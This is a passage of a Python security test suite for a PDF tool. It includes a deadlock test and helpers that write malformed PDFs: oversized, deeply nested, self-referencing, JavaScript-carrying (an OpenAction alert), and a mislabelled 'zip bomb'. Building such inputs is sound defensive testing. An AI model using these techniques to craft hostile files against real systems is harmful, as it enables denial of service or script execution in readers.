                    result = self.pdf_operations.rotate_pdf(
                        pdf_path=str(file_b),
                        angles=[180],
                        output_path=str(self.config.temp_dir / \"b_to_a.pdf\")
                    )
                    return {\"operation\": \"b_to_a\", \"success\": result.success}
                except Exception as e:
                    return {\"operation\": \"b_to_a\", \"success\": False, \"error\": str(e)}
            
            # Run operations that could potentially deadlock
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=2) as executor:
                future_a = executor.submit(operation_a_to_b)
                future_b = executor.submit(operation_b_to_a)
                
                try:
                    result_a = future_a.result(timeout=30)
                    result_b = future_b.result(timeout=30)
                    
                    execution_time = time.time() - start_time
                    results[\"details\"][\"execution_time\"] = execution_time
                    results[\"details\"][\"operation_a_result\"] = result_a
                    results[\"details\"][\"operation_b_result\"] = result_b
                    
                    if execution_time > 25:  # Close to timeout
                        results[\"details\"][\"potential_deadlock\"] = f\"Operations took {execution_time:.2f} seconds - potential deadlock\"
                        
                except Exception as e:
                    results[\"passed\"] = False
                    results[\"details\"][\"deadlock_detected\"] = str(e)
                    
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    # Helper methods for creating test files
    
    def _create_oversized_pdf(self) -> Optional[Path]:
        \"\"\"Create an oversized PDF for testing.\"\"\"
        try:
            oversized_pdf = self.config.temp_dir / \"oversized.pdf\"
            # Create a large dummy file
            with open(oversized_pdf, \"wb\") as f:
                f.write(b\"%PDF-1.4\\n\" + b\"A\" * (10 * 1024 * 1024))  # 10MB of data
            return oversized_pdf
        except Exception:
            return None
    
    def _create_deeply_nested_pdf(self) -> Optional[Path]:
        \"\"\"Create a PDF with deeply nested structures.\"\"\"
        try:
            nested_pdf = self.config.temp_dir / \"nested.pdf\"
            # Create a minimal PDF with nested structure
            with open(nested_pdf, \"wb\") as f:
                f.write(b\"%PDF-1.4\\n\")
                # Add deeply nested objects (simplified)
                for i in range(1000):
                    f.write(f\"{i} 0 obj\\n<< /Type /Catalog >>\\nendobj\\n\".encode())
            return nested_pdf
        except Exception:
            return None
    
    def _create_recursive_pdf(self) -> Optional[Path]:
        \"\"\"Create a PDF with recursive references.\"\"\"
        try:
            recursive_pdf = self.config.temp_dir / \"recursive.pdf\"
            with open(recursive_pdf, \"wb\") as f:
                f.write(b\"%PDF-1.4\\n\")
                f.write(b\"1 0 obj\\n<< /Type /Catalog /Pages 2 0 R >>\\nendobj\\n\")
                f.write(b\"2 0 obj\\n<< /Type /Pages /Kids [2 0 R] >>\\nendobj\\n\")  # Self-reference
            return recursive_pdf
        except Exception:
            return None
    
    def _create_javascript_pdf(self) -> Optional[Path]:
        \"\"\"Create a PDF with JavaScript content.\"\"\"
        try:
            js_pdf = self.config.temp_dir / \"javascript.pdf\"
            with open(js_pdf, \"wb\") as f:
                f.write(b\"%PDF-1.4\\n\")
                f.write(b\"1 0 obj\\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>\\nendobj\\n\")
            return js_pdf
        except Exception:
            return None
    
    def _create_zip_bomb_pdf(self) -> Optional[Path]:
        \"\"\"Create a PDF that simulates zip bomb behavior.\"\"\"
        try:
            zip_bomb_pdf = self.config.temp_dir / \"zip_bomb.pdf\"
            with open(zip_bomb_pdf, \"wb\") as f:
                f.write(b\"%PDF-1.4\\n\")
                # Create a PDF with highly compressed content that expands significantly
                compressed_data = b\"A\" * 1000  # Small data
                for i in range(10000):  # That references itself many times
                    f.write(compressed_data)
            return zip_bomb_pdf
        except Exception:
            return None